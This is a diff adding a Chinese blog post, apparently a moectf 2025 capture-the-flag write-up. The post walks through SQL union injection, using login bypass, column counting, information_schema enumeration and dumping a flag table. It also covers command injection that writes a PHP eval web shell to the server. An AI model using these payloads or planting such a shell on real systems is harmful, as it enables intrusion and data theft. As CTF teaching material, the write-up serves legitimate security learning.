@@ -141,7 +141,7 @@
   <nav class="site-state">
       <div class="site-state-item site-state-posts">
         <a href="/archives/">
-          <span class="site-state-item-count">6</span>
+          <span class="site-state-item-count">7</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
@@ -159,6 +159,91 @@
     </div>
 
     <div class="main-inner index posts-expand">
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2026/01/30/moectf2025-Web-Day2/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/image.png">
+      <meta itemprop="name" content="Kwan1">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Kwan1's Blog">
+      <meta itemprop="description" content="无论云泥意贯一">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content=" | Kwan1's Blog">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2026/01/30/moectf2025-Web-Day2/" class="post-title-link" itemprop="url">moectf2025-Web-Day2</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+      
+
+      <time title="创建时间：2026-01-30 17:50:57 / 修改时间：20:57:08" itemprop="dateCreated datePublished" datetime="2026-01-30T17:50:57+08:00">2026-01-30</time>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <h2 id="Web08-第八章-天衍真言，星图显圣"><a href="#Web08-第八章-天衍真言，星图显圣" class="headerlink" title="Web08 第八章 天衍真言，星图显圣"></a>Web08 第八章 天衍真言，星图显圣</h2><p>SQL联合查询注入。<br>一个登录界面，发现传参为username和password 万能密码尝试登录后发现：<br>?username&#x3D;&amp;password&#x3D;’ or 1&#x3D;’1<br>回显为 Welcome admin，因此可以判断应该存在admin这个用户</p>
+<p>一点前置知识：<br>–代表注释<br>union联合查询需要查询结果的列数相同，利用union可以执行我们想执行的sql语句，从而将其他表内的信息带出来。</p>
+<p>接下来的流程：</p>
+<h3 id="1-确定查询返回列数"><a href="#1-确定查询返回列数" class="headerlink" title="1 确定查询返回列数"></a>1 确定查询返回列数</h3><p>select查询后 会返回一个table。Table有行和列，列代表属性，行代表数据。<br>order by 可以根据属性（列名）进行排序，也可以直接按列序号排序。如果列序号不存在会报错。如果ORDER BY 3正确，ORDER BY 4却报错，即可确认查询结果表中有3列。<br>注入exp：<br>?username&#x3D;admin’ order by 1 – &amp;password&#x3D;<br>?username&#x3D;admin’ order by 2 – &amp;password&#x3D;<br>?username&#x3D;admin’ order by 3 – &amp;password&#x3D;<br>发现3时报错，说明返回表中有2列。</p>
+<h3 id="2-确定可显示列"><a href="#2-确定可显示列" class="headerlink" title="2 确定可显示列"></a>2 确定可显示列</h3><p>SQL查询返回的所有列，不一定都会显示在网页上，需要确认哪些列可以显示从而被我们看到.<br>尝试：<br>?username&#x3D;’ union select 1,2 – &amp;password&#x3D;<br>发现回显为1<br>?username&#x3D;’ union select 2,1 – &amp;password&#x3D;<br>发现回显为2，那么可显示列就是查询结果的第一列。</p>
+<p>这里注意 要让我们原本查询结果为空 否则如果查出值（比如这个题会回显admin）可能覆盖我们后面想要查出的值。如果用?username&#x3D;admin’ union select 2,1 – &amp;password&#x3D;，会发现返回结果是admin<br>此外 select不仅可以从表里查，还可以查询常量，这里就是利用了查询常量的特性。举个例子：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">-- 测试1：最简单的SELECT</span><br><span class="line">SELECT 1;</span><br><span class="line">-- 返回：</span><br><span class="line">┌───┐</span><br><span class="line">│ 1 │</span><br><span class="line">└───┘</span><br><span class="line"></span><br><span class="line">-- 测试2：多个值</span><br><span class="line">SELECT 1, 2, 3;</span><br><span class="line">-- 返回：</span><br><span class="line">┌───┬───┬───┐</span><br><span class="line">│ 1 │ 2 │ 3 │</span><br><span class="line">└───┴───┴───┘</span><br><span class="line"></span><br><span class="line">-- 测试3：混合类型</span><br><span class="line">SELECT <span class="string">&#x27;张三&#x27;</span> as 姓名, 18 as 年龄, NOW() as 时间;</span><br><span class="line">-- 返回：</span><br><span class="line">┌────────┬──────┬─────────────────────┐</span><br><span class="line">│ 姓名   │ 年龄 │ 时间               │</span><br><span class="line">├────────┼──────┼─────────────────────┤</span><br><span class="line">│ 张三   │ 18   │ 2023-10-01 10:00:00 │</span><br><span class="line">└────────┴──────┴─────────────────────┘</span><br></pre></td></tr></table></figure>
+<p>因此我们确定了可显示列为第一列。</p>
+<h3 id="3-数据库名查询"><a href="#3-数据库名查询" class="headerlink" title="3 数据库名查询"></a>3 数据库名查询</h3><p>?username&#x3D;1’ union select database(),2 – &amp;password&#x3D;<br>先查到数据库名 才能查这个数据库里的表 才能查表里字段进而拿数据。<br>database() 是MySQL内置的函数，返回当前连接的数据库名称<br>类似的其他函数：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 函数，要加括号调用</span></span><br><span class="line"><span class="keyword">SELECT</span> database();    <span class="comment">-- ✅ 正确</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- 类似的其他函数：</span></span><br><span class="line"><span class="keyword">SELECT</span> version();     <span class="comment">-- 返回MySQL版本</span></span><br><span class="line"><span class="keyword">SELECT</span> <span class="keyword">user</span>();        <span class="comment">-- 返回当前用户</span></span><br><span class="line"><span class="keyword">SELECT</span> NOW();         <span class="comment">-- 返回当前时间</span></span><br></pre></td></tr></table></figure>
+<p>回显为user 因此应该到user里查表</p>
+<h3 id="4-查询表名"><a href="#4-查询表名" class="headerlink" title="4 查询表名"></a>4 查询表名</h3><p>接下来我们需要查看user里表的名字。<br>MySQL数据库的元数据库information_schema记录了所有数据库、表、字段的名字。<br>‘ union SELECT table_name,2 FROM information_schema.tables WHERE table_schema&#x3D;’user’ –<br>发现回显为flag，可以对这个表进行查询</p>
+<p>然而，一个数据库可能有多个表，SELECT会返回多行，使用group_concat()包裹即可输出成一行。<br>‘ union SELECT group_concat(table_name),2 FROM information_schema.tables WHERE table_schema&#x3D;’user’ – </p>
+<p>这样的话回显就是flag和users了，说明有两个表</p>
+<h3 id="5-查表读数据"><a href="#5-查表读数据" class="headerlink" title="5 查表读数据"></a>5 查表读数据</h3><p>‘ union SELECT *,2 FROM flag –<br>*是通配符 会自行展开成表中的属性 这里的2用来站位。<br>需要注意 这里如果select 1,2 from flag 其含义不是select第一列属性和第二列属性，而是会返回一个行数与flag相同 每行数据均为1,2的表<br>flag为：<br>moectf{UnlOn_64S3d-SQII-FtW!1185c23d8b}</p>
+<h2 id="Web09-第九章-星墟禁制·天机问路"><a href="#Web09-第九章-星墟禁制·天机问路" class="headerlink" title="Web09 第九章 星墟禁制·天机问路"></a>Web09 第九章 星墟禁制·天机问路</h2><p>命令执行<br>题目要求我们输入一个url，以get方式传参。<br>直接用;截断，然后即可执行命令。<br>可以写个马进去：<br>128.0.0.1;echo “<?php eval(\$_POST[2]);?>“ &gt; .&#x2F;2.php<br>发现在全局变量里。<br>直接env即可显示<br>FLAG&#x3D;moectf{ea5c141b-4d97-2d1a-c618-f5d917dae823}</p>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
 
     
 
